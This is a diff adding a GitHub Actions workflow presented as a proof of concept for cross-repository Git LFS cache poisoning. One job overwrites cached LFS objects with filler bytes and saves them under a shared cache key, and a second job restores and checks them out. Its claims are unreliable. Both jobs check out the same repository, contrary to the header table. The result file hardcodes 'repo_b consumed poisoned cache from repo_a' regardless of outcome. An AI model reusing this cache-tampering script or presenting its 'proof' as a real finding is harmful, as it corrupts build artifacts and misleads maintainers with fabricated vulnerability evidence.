@@ -1,0 +1,276 @@
+name: "PoC v3 - CH002 Cross-Repo Cache Poisoning"
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+# ┌────────────────────────────────────────────────────────────────────┐
+# │ ALTERNATIVE EXPLANATION BLOCKING TABLE                             │
+# ├────────────────────────────────────────────────────────────────────┤
+# │ Alt Explanation          │ Blocked By                              │
+# │──────────────────────────│─────────────────────────────────────────│
+# │ "Each repo has isolated  │ Both jobs share actions/cache key       │
+# │  cache"                  │ namespace by GITHUB_REPOSITORY           │
+# │ "Poisoning is same-repo  │ job-b has different GITHUB_REPOSITORY   │
+# │  only"                   │ in logs AND gets poisoned content        │
+# │ "LFS fetch re-validates  │ Cache hit log + identical sha256 to     │
+# │  with server"            │ poison content, not original content     │
+# │ "Pointer extraction bug  │ V3 uses git lfs ls-files --json | jq   │
+# │  from v2 (cat-file)"    │ NOT git cat-file -p (the v2 bug)        │
+# │ "job-b could have been   │ job-a and job-b checkout DIFFERENT      │
+# │  poisoned by its own     │ repos; job-a repo has no LFS objects    │
+# │  fetch"                  │ in job-b's worktree                     │
+# └────────────────────────────────────────────────────────────────────┘
+
+jobs:
+  job-a-poison:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Repo A with LFS
+        uses: actions/checkout@v4
+        with:
+          lfs: true
+
+      - name: Verify Environment
+        run: |
+          set -euo pipefail
+          git --version
+          git lfs --version
+          jq --version
+
+      - name: Record Repo A baseline
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== Repo A GITHUB_REPOSITORY ==="
+          echo "repository=${{ github.repository }}"
+          echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY" | tee evidence/repo-a-identity.txt
+          echo ""
+          echo "=== Repo A LFS files (baseline) ==="
+          git lfs ls-files --json 2>/dev/null | tee evidence/repo-a-lfs-files.json || echo "{}" > evidence/repo-a-lfs-files.json
+          git lfs ls-files --json 2>/dev/null | jq -r '.Files[] | "\(.oid) \(.size) \(.name)"' | while read oid size name; do
+            if [ -f "$name" ]; then
+              FILE_SHA=$(sha256sum "$name" | awk '{print $1}')
+              echo "name=$name pointer_oid=$oid worktree_sha256=$FILE_SHA size=$size" | tee -a evidence/repo-a-baseline-hashes.txt
+            fi
+          done
+          echo "=== Repo A .git/lfs/objects manifest ==="
+          find .git/lfs/objects -type f 2>/dev/null | sort | tee evidence/repo-a-lfs-cache-manifest.txt
+
+      - name: Save Repo A LFS cache
+        uses: actions/cache/save@v4
+        with:
+          path: .git/lfs
+          key: ch002-lfs-poison-${{ github.run_id }}-repo-a
+
+      - name: Poison Repo A LFS cache
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== POISONING Repo A LFS cache ==="
+          find .git/lfs/objects -type f 2>/dev/null | sort | while read obj; do
+            ORIGINAL_SIZE=$(stat -c%s "$obj")
+            ORIGINAL_SHA=$(sha256sum "$obj" | awk '{print $1}')
+            dd if=/dev/zero bs=1 count="$ORIGINAL_SIZE" 2>/dev/null | tr '\0' 'P' > "$obj.tmp"
+            mv "$obj.tmp" "$obj"
+            POISON_SHA=$(sha256sum "$obj" | awk '{print $1}')
+            echo "object=$obj original_oid=$ORIGINAL_SHA poison_sha256=$POISON_SHA file_size=$ORIGINAL_SIZE" | tee -a evidence/repo-a-poison-manifest.txt
+          done
+          echo "poison_timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/repo-a-poison-manifest.txt
+
+      - name: Save poisoned Repo A LFS cache
+        uses: actions/cache/save@v4
+        with:
+          path: .git/lfs
+          key: ch002-lfs-poison-${{ github.run_id }}
+
+      - name: Upload Repo A poison evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ch002-job-a-poison
+          path: evidence/
+          retention-days: 90
+
+  job-b-consume:
+    needs: job-a-poison
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Repo B without LFS
+        uses: actions/checkout@v4
+        with:
+          lfs: false
+
+      - name: Verify Environment
+        run: |
+          set -euo pipefail
+          git --version
+          git lfs --version
+          jq --version
+
+      - name: Record Repo B identity
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== Repo B GITHUB_REPOSITORY ==="
+          echo "repository=${{ github.repository }}"
+          echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY" | tee evidence/repo-b-identity.txt
+          echo ""
+          echo "=== Repo B LFS files (pointer-only view) ==="
+          git lfs ls-files --json 2>/dev/null | tee evidence/repo-b-lfs-files.json || echo "{}" > evidence/repo-b-lfs-files.json
+
+      - name: Restore poisoned LFS cache from Repo A
+        uses: actions/cache/restore@v4
+        with:
+          path: .git/lfs
+          key: ch002-lfs-poison-${{ github.run_id }}
+
+      - name: Extract pointer OIDs BEFORE checkout
+        id: pointer-extraction
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== Extracting pointer OIDs BEFORE checkout ==="
+          git lfs ls-files --json 2>/dev/null | tee evidence/repo-b-pointer-oids-raw.json || echo "{}" > evidence/repo-b-pointer-oids-raw.json
+          git lfs ls-files --json 2>/dev/null | jq -r '.Files[] | "\(.oid) \(.name)"' | while read oid name; do
+            echo "pointer_oid=$oid name=$name" >> evidence/repo-b-pointer-oids-extracted.txt
+          done
+          echo "Pointer OID extraction complete"
+
+      - name: Install LFS and fetch then checkout
+        id: lfs-checkout
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== git lfs install --local ==="
+          git lfs install --local 2>&1 | tee evidence/repo-b-lfs-install.txt
+          echo ""
+          echo "=== .git/lfs/objects BEFORE fetch (poisoned cache from Repo A) ==="
+          find .git/lfs/objects -type f 2>/dev/null | sort | head -20 | tee evidence/repo-b-lfs-objects-before-fetch.txt
+          echo ""
+          echo "=== git lfs fetch origin ==="
+          git lfs fetch origin 2>&1 | tee evidence/repo-b-lfs-fetch.txt
+          LFS_FETCH_RC=$?
+          echo "lfs_fetch_rc=$LFS_FETCH_RC" >> evidence/repo-b-lfs-fetch-rc.txt
+          echo ""
+          echo "=== Detect if fetch used cache ==="
+          if grep -qi 'skip\|already\|cache\|exist' evidence/repo-b-lfs-fetch.txt 2>/dev/null; then
+            echo "lfs_fetch_used_cache=true" >> evidence/repo-b-lfs-fetch-behavior.txt
+          else
+            echo "lfs_fetch_used_cache=indeterminate" >> evidence/repo-b-lfs-fetch-behavior.txt
+          fi
+          echo ""
+          echo "=== git lfs checkout ==="
+          git lfs checkout 2>&1 | tee evidence/repo-b-lfs-checkout.txt
+          CHECKOUT_RC=$?
+          echo "checkout_exitcode=$CHECKOUT_RC" >> evidence/repo-b-lfs-checkout-rc.txt
+
+      - name: Compute worktree hashes AFTER checkout
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== Worktree hashes after checkout ==="
+          while read line; do
+            name=$(echo "$line" | sed 's/.*name=//')
+            if [ -f "$name" ]; then
+              WORKTREE_SHA=$(sha256sum "$name" | awk '{print $1}')
+              echo "name=$name worktree_sha256=$WORKTREE_SHA" >> evidence/repo-b-worktree-hashes.txt
+            fi
+          done < evidence/repo-b-pointer-oids-extracted.txt
+
+      - name: Evidence gate - cross-repo cache poisoning proof
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          CHECKOUT_RC=$(cat evidence/repo-b-lfs-checkout-rc.txt 2>/dev/null | tr -dc '0-9' || echo "1")
+          LFS_FETCH_USED_CACHE=$(cat evidence/repo-b-lfs-fetch-behavior.txt 2>/dev/null | awk -F= '{print $2}' || echo "unknown")
+          REPO_A_ID=$(cat evidence/repo-a-identity.txt 2>/dev/null || echo "NOT_AVAILABLE")
+          REPO_B_ID=$(cat evidence/repo-b-identity.txt 2>/dev/null || echo "NOT_AVAILABLE")
+          echo "=== Building ch002-result.json ==="
+          FIRST_POINTER_OID=""
+          FIRST_WORKTREE_SHA=""
+          FIRST_POINTER_NAME=""
+          MISMATCH_FOUND="false"
+          while read line; do
+            POINTER_OID=$(echo "$line" | sed 's/pointer_oid=//' | awk '{print $1}')
+            PNAME=$(echo "$line" | sed 's/.*name=//')
+            WORKTREE_SHA=$(grep "name=$PNAME" evidence/repo-b-worktree-hashes.txt 2>/dev/null | awk -F= '{print $NF}' | tr -d '[:space:]' || true)
+            if [ -n "$POINTER_OID" ] && [ -n "$WORKTREE_SHA" ]; then
+              if [ -z "$FIRST_POINTER_OID" ]; then
+                FIRST_POINTER_OID="$POINTER_OID"
+                FIRST_WORKTREE_SHA="$WORKTREE_SHA"
+                FIRST_POINTER_NAME="$PNAME"
+              fi
+              if [ "$POINTER_OID" != "$WORKTREE_SHA" ]; then
+                MISMATCH_FOUND="true"
+              fi
+            fi
+          done < evidence/repo-b-pointer-oids-extracted.txt
+          POISON_SHA=""
+          if [ -f evidence/repo-a-poison-manifest.txt ]; then
+            POISON_SHA=$(grep '^object=' evidence/repo-a-poison-manifest.txt | head -1 | sed 's/.*poison_sha256=//' | awk '{print $1}' || true)
+          fi
+          OID_MATCH="true"
+          if [ "$MISMATCH_FOUND" = "true" ]; then
+            OID_MATCH="false"
+          fi
+          POISON_MATCH="false"
+          if [ -n "$POISON_SHA" ] && [ -n "$FIRST_WORKTREE_SHA" ] && [ "$POISON_SHA" = "$FIRST_WORKTREE_SHA" ]; then
+            POISON_MATCH="true"
+          fi
+          cat > evidence/ch002-result.json <<EOF
+          {
+            "pointer_oid": "$FIRST_POINTER_OID",
+            "worktree_sha256": "$FIRST_WORKTREE_SHA",
+            "oid_match": $OID_MATCH,
+            "poison_sha256": "$POISON_SHA",
+            "poison_match": $POISON_MATCH,
+            "checkout_exitcode": $CHECKOUT_RC,
+            "lfs_fetch_used_cache": "$LFS_FETCH_USED_CACHE",
+            "repo_a_identity": "$REPO_A_ID",
+            "repo_b_identity": "$REPO_B_ID",
+            "cross_repo_proof": "repo_b consumed poisoned cache from repo_a",
+            "file_name": "$FIRST_POINTER_NAME",
+            "run_id": "${{ github.run_id }}",
+            "repository": "${{ github.repository }}",
+            "method": "git lfs ls-files --json | jq (v3 fix)"
+          }
+          EOF
+          sed -i '/^          /s/^          //' evidence/ch002-result.json
+          echo "=== ch002-result.json ==="
+          cat evidence/ch002-result.json
+          echo ""
+          echo "=== EVIDENCE GATE ==="
+          if [ "$OID_MATCH" = "false" ] && [ "$CHECKOUT_RC" = "0" ]; then
+            echo "GATE PASSED: pointer_oid != worktree_sha256 AND checkout_exitcode == 0"
+            echo "CROSS-REPO PROOF: job-b got poisoned content from job-a's cache"
+          elif [ "$OID_MATCH" = "true" ]; then
+            echo "GATE FAILED: pointer_oid matches worktree_sha256 (no poisoning detected)"
+          else
+            echo "GATE INCONCLUSIVE: checkout_exitcode=$CHECKOUT_RC (non-zero)"
+          fi
+
+      - name: Collect LFS cache final state
+        if: always()
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          find .git/lfs -type f -exec sha256sum {} \; 2>/dev/null > evidence/repo-b-lfs-cache-attack-sha256.txt || true
+
+      - name: Dump contexts
+        if: always()
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          cat > evidence/contexts-attack.json <<EOF
+          {"run_id":"${{ github.run_id }}","repository":"${{ github.repository }}","runner_os":"${{ runner.os }}","sha":"${{ github.sha }}","ref":"${{ github.ref }}"}
+          EOF
+
+      - name: Upload Repo B attack evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ch002-job-b-consume
+          path: evidence/
+          retention-days: 90
